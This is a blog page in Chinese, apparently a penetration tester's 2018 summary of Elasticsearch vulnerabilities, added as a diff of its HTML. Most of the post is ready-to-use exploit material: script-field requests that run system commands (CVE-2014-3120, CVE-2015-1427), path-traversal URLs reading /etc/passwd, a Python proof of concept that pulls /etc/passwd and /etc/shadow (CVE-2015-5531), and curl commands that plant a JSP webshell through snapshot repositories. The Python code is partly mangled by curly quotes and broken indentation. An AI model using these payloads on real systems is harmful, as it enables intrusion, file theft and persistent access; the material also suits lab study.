@@ -1,0 +1,870 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="getshell,Elsaticsearch,漏洞总结," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="SuNu11'Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="0.因众测过程中遇到了Elsaticsearch未授权访问的情况，搞完发现又把时间浪费在了查各种资料上，">
+<meta name="keywords" content="getshell,Elsaticsearch,漏洞总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Elsaticsearch 漏洞小结">
+<meta property="og:url" content="http://sunu11.com/2018/07/14/20/index.html">
+<meta property="og:site_name" content="SuNu11&#39;Blog">
+<meta property="og:description" content="0.因众测过程中遇到了Elsaticsearch未授权访问的情况，搞完发现又把时间浪费在了查各种资料上，">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-07-23T07:46:40.719Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Elsaticsearch 漏洞小结">
+<meta name="twitter:description" content="0.因众测过程中遇到了Elsaticsearch未授权访问的情况，搞完发现又把时间浪费在了查各种资料上，">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'SuNu11'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://sunu11.com/2018/07/14/20/"/>
+
+
+
+
+
+  <title> Elsaticsearch 漏洞小结 | SuNu11'Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">SuNu11'Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/index.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/index.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/index.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/index.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-guide">
+          <a href="/Guide/index.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            航海图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://sunu11.com/2018/07/14/20/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="SuNu11">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/me.png">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="SuNu11'Blog">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="SuNu11'Blog" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Elsaticsearch 漏洞小结
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-14T00:06:05+08:00">
+                2018-07-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <a href="/2018/07/14/20/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2018/07/14/20/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="0-因"><a href="#0-因" class="headerlink" title="0.因"></a>0.因</h3><p>众测过程中遇到了Elsaticsearch未授权访问的情况，搞完发现又把时间浪费在了查各种资料上，<a id="more"></a>故小记一番。</p>
+<h3 id="1-果"><a href="#1-果" class="headerlink" title="1.果"></a>1.果</h3><h4 id="1-1-CVE-2014-3120-elasticsearch-v1-1-1-–-命令执行漏洞"><a href="#1-1-CVE-2014-3120-elasticsearch-v1-1-1-–-命令执行漏洞" class="headerlink" title="1.1 (CVE-2014-3120)elasticsearch v1.1.1 – 命令执行漏洞"></a>1.1 (CVE-2014-3120)elasticsearch v1.1.1 – 命令执行漏洞</h4><h5 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h5><p>1、创建数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">posturl: http://ip:9200/foo/foo2</div><div class="line"></div><div class="line">postdata：</div><div class="line"></div><div class="line">&#123;</div><div class="line">  &quot;name&quot;: &quot;data&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>2、执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">posturl: http://ip:9200/_search?pretty </div><div class="line"></div><div class="line">postdata:</div><div class="line">&#123;</div><div class="line">    &quot;size&quot;: 1,</div><div class="line">    &quot;query&quot;: &#123;</div><div class="line">      &quot;filtered&quot;: &#123;</div><div class="line">        &quot;query&quot;: &#123;</div><div class="line">          &quot;match_all&quot;: &#123;</div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;,</div><div class="line">    &quot;script_fields&quot;: &#123;</div><div class="line">        &quot;command&quot;: &#123;</div><div class="line">            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h5 id="其他资料："><a href="#其他资料：" class="headerlink" title="其他资料："></a>其他资料：</h5><p>（1）dockerfile地址<br><a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120</a><br><br>（2）<a href="https://www.t00ls.net/viewthread.php?tid=29408" target="_blank" rel="external">https://www.t00ls.net/viewthread.php?tid=29408</a><br><br>（3）<a href="http://bouk.co/blog/elasticsearch-rce" target="_blank" rel="external">http://bouk.co/blog/elasticsearch-rce</a><br></p>
+<h4 id="1-2-（CVE-2015-1427）ElasticSearch-Groovy-v1-4-2以下-–-沙盒绕过-amp-amp-代码执行漏洞"><a href="#1-2-（CVE-2015-1427）ElasticSearch-Groovy-v1-4-2以下-–-沙盒绕过-amp-amp-代码执行漏洞" class="headerlink" title="1.2 （CVE-2015-1427）ElasticSearch Groovy v1.4.2以下 – 沙盒绕过 &amp;&amp; 代码执行漏洞"></a>1.2 （CVE-2015-1427）ElasticSearch Groovy v1.4.2以下 – 沙盒绕过 &amp;&amp; 代码执行漏洞</h4><h5 id="利用：-1"><a href="#利用：-1" class="headerlink" title="利用："></a>利用：</h5><p>Java沙盒绕过法：</p>
+<blockquote>
+<p>java.lang.Math.class.forName(“java.lang.Runtime”).getRuntime().exec(“id”).getText()</p>
+</blockquote>
+<p>Goovy直接执行命令法：</p>
+<blockquote>
+<p>def command=’id’;def res=command.execute().text;res</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">posturl: http://ip:9200/_search?pretty </div><div class="line">postdata:</div><div class="line">&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;&#125;&#125;&#125;</div></pre></td></tr></table></figure>
+<h5 id="其他资料：-1"><a href="#其他资料：-1" class="headerlink" title="其他资料："></a>其他资料：</h5><p>(1）dockerfile地址:<a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427</a><br><br>(2）<a href="http://cb.drops.wiki/drops/papers-5107.html" target="_blank" rel="external">http://cb.drops.wiki/drops/papers-5107.html</a><br><br>(3）<a href="http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427" target="_blank" rel="external">http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427</a><br><br>(4）<a href="https://github.com/XiphosResearch/exploits" target="_blank" rel="external">https://github.com/XiphosResearch/exploits</a><br><br>(5）<a href="http://cb.drops.wiki/drops/papers-5142.html" target="_blank" rel="external">http://cb.drops.wiki/drops/papers-5142.html</a><br></p>
+<h4 id="1-3（CVE-2015-3337）ElasticSearch-1-4-5以下-1-5-2以下-–-目录穿越漏洞"><a href="#1-3（CVE-2015-3337）ElasticSearch-1-4-5以下-1-5-2以下-–-目录穿越漏洞" class="headerlink" title="1.3（CVE-2015-3337）ElasticSearch 1.4.5以下/1.5.2以下 – 目录穿越漏洞"></a>1.3（CVE-2015-3337）ElasticSearch 1.4.5以下/1.5.2以下 – 目录穿越漏洞</h4><h5 id="利用：-2"><a href="#利用：-2" class="headerlink" title="利用："></a>利用：</h5><p>读服务器上文件：burpsuite的repeater中访问url：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ip:9200/_plugin/head/../../../../../../../../../etc/passwd</div></pre></td></tr></table></figure>
+<h5 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h5><p>（1）原理：在安装了具有“site”功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。<br><br>（2）dockerfile地址：<a href="https://github.com/vulhub/vulhub/pulse" target="_blank" rel="external">https://github.com/vulhub/vulhub/pulse</a><br></p>
+<h4 id="1-4-（CVE-2015-5531）ElasticSearch-1-6-1以下-–-目录穿越漏洞"><a href="#1-4-（CVE-2015-5531）ElasticSearch-1-6-1以下-–-目录穿越漏洞" class="headerlink" title="1.4 （CVE-2015-5531）ElasticSearch 1.6.1以下 – 目录穿越漏洞"></a>1.4 （CVE-2015-5531）ElasticSearch 1.6.1以下 – 目录穿越漏洞</h4><h5 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h5><p>该漏洞在elasticsearch 1.5.1及以前，无需任何配置即可触发。之后的新版，<em>配置文件elasticsearch.yml中必须存在path.repo，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能</em>。</p>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>1、创建一个仓库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">puturl: /_snapshot/test</div><div class="line"></div><div class="line">putdata:</div><div class="line">&#123;</div><div class="line">    &quot;type&quot;: &quot;fs&quot;,</div><div class="line">    &quot;settings&quot;: &#123;</div><div class="line">        &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test&quot; </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>2、创建一个快照：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">puturl: /_snapshot/test2</div><div class="line"></div><div class="line">putdata:</div><div class="line">&#123;</div><div class="line">    &quot;type&quot;: &quot;fs&quot;,</div><div class="line">    &quot;settings&quot;: &#123;</div><div class="line">        &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test/snapshot-backdata&quot; </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>3、目录穿越访问服务器文件，在burpsuite 中repeater访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</div></pre></td></tr></table></figure></p>
+<p>4、从repeater中将错误信息解码，即可得到对应服务器文件（passwd）信息。</p>
+<h5 id="其他资料：-2"><a href="#其他资料：-2" class="headerlink" title="其他资料："></a>其他资料：</h5><p>（1）原理：elasticsearch中备份的快照保存在备份仓库中的命名格式是以snapshot-xxx的格式,所以snapshot-backdata 会被误以为是test仓库的backdata快照，快照都是文件形式保存的，而snapshot-backdata是目录，elasticsearch 没有区分，如果elasticsearch发现其是目录之后，就继续读取目录下的内容，如果目录下的文件明称是恶意构造的(类似../../../) elasticsearch就会去读取这个递归读取文件的内容（这里elasticsearch没有过滤..），从而导致目录遍历（任意文件内容读取）<br><br>（2）dockerfile地址：<a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531</a><br><br>（3）python poc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf8 -*-</div><div class="line">&quot;&quot;&quot;</div><div class="line">PoC for CVE-2015-5531</div><div class="line">Affects ElasticSearch 1.6.0 and prior</div><div class="line">&quot;&quot;&quot;</div><div class="line">import re</div><div class="line">import sys</div><div class="line">import json</div><div class="line">import requests</div><div class="line">import urllib</div><div class="line">import argparse</div><div class="line">import traceback</div><div class="line">import termcolor</div><div class="line">def colorize_red(string):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    :param string:</div><div class="line">    :return</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    return termcolor.colored(string, &apos;red&apos;)</div><div class="line">def colorize_green(string):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    :param string:</div><div class="line">    :return:</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    return termcolor.colored(string, &apos;green&apos;)</div><div class="line">def create_repos(base_url):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    :param base_url:</div><div class="line">    :return: None</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    for index, repo_name in enumerate(REPO_NAME_LST):</div><div class="line">        </div><div class="line">        url = &quot;&#123;0&#125;&#123;1&#125;&quot;.format(base_url, repo_name)</div><div class="line">        req = requests.post(url, json=DATA_REPO_LST[index])</div><div class="line">         </div><div class="line">        if “acknowledged” in req.json():</div><div class="line">            print colorize_green(“repository &#123;0&#125;: create success”.format(repo_name))</div><div class="line">def grab_file(vuln_url):</div><div class="line">    “”&quot;</div><div class="line">    :param xplurl:</div><div class="line">    :return:</div><div class="line">    “”&quot;</div><div class="line">    </div><div class="line">    req = requests.get(vuln_url)</div><div class="line">    if req.status_code == 400:</div><div class="line">        data = req.json()</div><div class="line">        extrdata = re.findall(r’\d+’, str(data[&apos;error&apos;]))</div><div class="line">        decoder = bytearray()</div><div class="line">        for i in extrdata[2:]:</div><div class="line">            decoder.append(int(i))</div><div class="line">        print colorize_green(decoder)</div><div class="line">def exploit(**args):</div><div class="line">    “”&quot;</div><div class="line">    :param args:</div><div class="line">    :return:</div><div class="line">    “”&quot;</div><div class="line">    target = args[&apos;target&apos;]</div><div class="line">    port = args[&apos;port&apos;]</div><div class="line">    fpath = args[&apos;fpath&apos;].split(‘,’)</div><div class="line">    fpath = [urllib.quote(fp, safe=&apos;&apos;) for fp in fpath]</div><div class="line">    base_url = “http://&#123;0&#125;:&#123;1&#125;/_snapshot/”.format(target, port)</div><div class="line">    #create elasticsearch repository for snapshot</div><div class="line">    create_repos(base_url)</div><div class="line">    #grab files</div><div class="line">    for fp in fpath:</div><div class="line">        vuln_url = ‘&#123;0&#125;&#123;1&#125;/&#123;2&#125;&#123;3&#125;’.format(base_url, REPO_NAME_LST[0], FCK, fp)</div><div class="line">        print colorize_red(urllib.unquote(fp)) + “:\n”</div><div class="line">        grab_file(vuln_url)</div><div class="line">if __name__ == “__main__”:</div><div class="line">    # for global</div><div class="line">    FCK = ‘backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..’</div><div class="line">    REPO_NAME_LST = [&apos;test11&apos;, &apos;test12&apos;]</div><div class="line"> </div><div class="line">   DATA_REPO_LST = [&#123;&quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;&quot;location&quot;: </div><div class="line">&quot;/tmp/test30&quot;&#125;&#125;, &#123;&quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;&quot;location&quot;: </div><div class="line">&quot;/tmp/test30/snapshot-backdata&quot;&#125;&#125;]</div><div class="line">    parser = argparse.ArgumentParser(usage=”python cve-2015-5531.py options”,</div><div class="line">                                     description=”cve-2015-5531 Vuln PoC”, add_help=True)</div><div class="line">    parser.add_argument(‘-t’, ‘–target’, metavar=’TARGET’, type=str, dest=”target”, required=True, help=’eg: 127.0.0.1 or www.baidu.com’)</div><div class="line"> </div><div class="line">   parser.add_argument(‘-p’, ‘–port’, metavar=’PORT’, dest=’port’, </div><div class="line">type=int, default=9200, help=’elasticsearch port default 9200′)</div><div class="line">   </div><div class="line"> parser.add_argument(‘–fpath’, metavar=’FPATH’, dest=’fpath’, type=str,</div><div class="line"> default=’/etc/passwd,/etc/shadow’, help=’file to grab multi files </div><div class="line">separated by comma ‘)</div><div class="line">    args = parser.parse_args()</div><div class="line">    try:</div><div class="line">        exploit(**args.__dict__)</div><div class="line">    except:</div><div class="line">        traceback.print_exc()</div></pre></td></tr></table></figure>
+<h4 id="1-5（WooYun-2015-110216）Elasticsearch（1-5-x以下）–-写入webshell漏洞"><a href="#1-5（WooYun-2015-110216）Elasticsearch（1-5-x以下）–-写入webshell漏洞" class="headerlink" title="1.5（WooYun-2015-110216）Elasticsearch（1.5.x以下）– 写入webshell漏洞"></a>1.5（WooYun-2015-110216）Elasticsearch（1.5.x以下）– 写入webshell漏洞</h4><h5 id="说明：-1"><a href="#说明：-1" class="headerlink" title="说明："></a>说明：</h5><p>1、原理：<br>ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。<br>所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。</p>
+<p>2、利用方式：<br>在获取其他web服务的根目录后，直接使用ES写入对应木马文件至解析目录即可。<br>如tomcat服务web解析目录为：/usr/local/tomcat/webapps。<br>首先建立一个恶意索引文档：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">curl -XPOST http://ip:9200/yz.jsp/yz.jsp/1 -d&apos;</div><div class="line">&#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;</div><div class="line">&apos;</div></pre></td></tr></table></figure></p>
+<p>再创建一个恶意的存储库，其中location的值即为我要写入的路径。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">curl -XPUT &apos;http://ip:9200/_snapshot/yz.jsp&apos; -d &apos;&#123;</div><div class="line">     &quot;type&quot;: &quot;fs&quot;,</div><div class="line">     &quot;settings&quot;: &#123;</div><div class="line">          &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot&quot;,</div><div class="line">          &quot;compress&quot;: false</div><div class="line">     &#125;</div><div class="line">&#125;&apos;</div></pre></td></tr></table></figure></p>
+<p>存储库验证并创建:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">curl -XPUT &quot;http://ip:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &apos;&#123;</div><div class="line">     &quot;indices&quot;: &quot;yz.jsp&quot;,</div><div class="line">     &quot;ignore_unavailable&quot;: &quot;true&quot;,</div><div class="line">     &quot;include_global_state&quot;: false</div><div class="line">&#125;&apos;</div></pre></td></tr></table></figure></p>
+<p>最后访问写入的webshell即可：</p>
+<blockquote>
+<p><a href="http://ip:9200/wwwroot/indices/yz.jsp/snapshot-yz.jsp" target="_blank" rel="external">http://ip:9200/wwwroot/indices/yz.jsp/snapshot-yz.jsp</a></p>
+</blockquote>
+<p>上面的jsp文件作用为向wwwroot目录下的test.jsp文件写入任意字符如访问下面：</p>
+<blockquote>
+<p><a href="http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=test" target="_blank" rel="external">http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=test</a><br>将test.jsp中写入test。只需访问<a href="http://ip:8080/wwwroot/test.jsp即可看到其页面显示test。" target="_blank" rel="external">http://ip:8080/wwwroot/test.jsp即可看到其页面显示test。</a></p>
+</blockquote>
+<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>(1) 原理地址：<a href="http://cb.drops.wiki/bugs/wooyun-2015-0110216.html" target="_blank" rel="external">http://cb.drops.wiki/bugs/wooyun-2015-0110216.html</a><br><br>(2）dockerfile地址：<a href="https://github.com/vulhub/vulhub/tree/master/elasticsearch/WooYun-2015-110216" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/elasticsearch/WooYun-2015-110216</a><br></p>
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div> 
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div align="center">
+ 
+   <div class="">
+   <p><span>
+   <br/><br/><b>本文出处：</b><a href="/2018/07/14/20/" title="Elsaticsearch 漏洞小结">http://sunu11.com/2018/07/14/20/</a><br/><b>本文基于：</b><a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布，欢迎转载，演绎或用于商业目的，但是必须保留本文的署名<a href="http://www.sunu11.com/">sunu11</a>及链接。
+   </span></p>
+   </div>
+ 
+  </div>
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/alipay.png" alt="SuNu11 Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/getshell/" rel="tag"><i class="fa fa-tag"></i> getshell</a>
+          
+            <a href="/tags/Elsaticsearch/" rel="tag"><i class="fa fa-tag"></i> Elsaticsearch</a>
+          
